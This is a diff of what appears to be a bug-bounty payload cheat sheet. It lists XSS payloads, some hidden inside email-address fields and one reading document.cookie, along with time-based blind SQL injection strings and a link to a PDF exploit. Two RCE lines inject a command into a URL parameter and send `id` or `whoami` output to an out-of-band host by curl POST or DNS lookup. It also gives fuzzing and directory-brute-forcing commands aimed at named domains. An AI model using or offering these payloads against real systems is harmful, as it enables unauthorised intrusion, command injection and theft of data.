@@ -44,12 +44,33 @@ e%27"()%26%25<zzz><ScRiPt%20>alert(9155)</ScRiPt>
 PDF-prompt:
 https://raw.githubusercontent.com/coffinxp/pdFExploits/refs/heads/main/cookieprompt.pdf
 
+--------------------------------------------------------------------------------------------------------------------------
+
 CanaryTokens: https://canarytokens.org/nest/
 Blind XSS: https://xss0r.com/dashboard#payloads
 DNS: https://app.interactsh.com/#/
---------------------------------------------------------------------------------------------------------------------------
+
 RCE:  https://subdomain.domain.tld/emdpoint?param=value;curl https://leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun -X POST -d `id`
 RCE:  https://subdomain.domain.tld/emdpoint?param=value;nslookup `whoami`.leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun
 
 FUZZ:   ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt -u https://nxdev.bbbbbbbt.edu.bdFUZZ
 Dirsearch:  dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://adminblog.abc.com/
+
+Stored XSS in Email Fields:
+--------------------------
+validemail+test<h1/onmouseover​=alert(origin)>test@gmail.com
+lipsec+<h1/onmouseover​=alert(origin)>lipseclimited@gmail.com
+
+XSS in Email Login Fields:
+Validator: https://www.randomstuff.org.uk/emailvalidator.shtml
+test+(<script>alert(document.domain)</script>)@gmail.com
+"><svg/onload=confirm('XSS')>"@x.y
+"><img src=x onerror=alert(document.cookie);>
+“><svg/onload=confirm(1)>”@gmail.com
+
+Persistent XSS in the Signup Process:
+<img src=x onerror​=alert(origin)>
+
+SQLi Blind Time Base:
+xss' AND (SELECT 8091 FROM (SELECT(SLEEP(5)))sRDf) AND 'wRgw'='wRgw
+XOR(if(now()=sysdate(),sleep(5),0))XOR
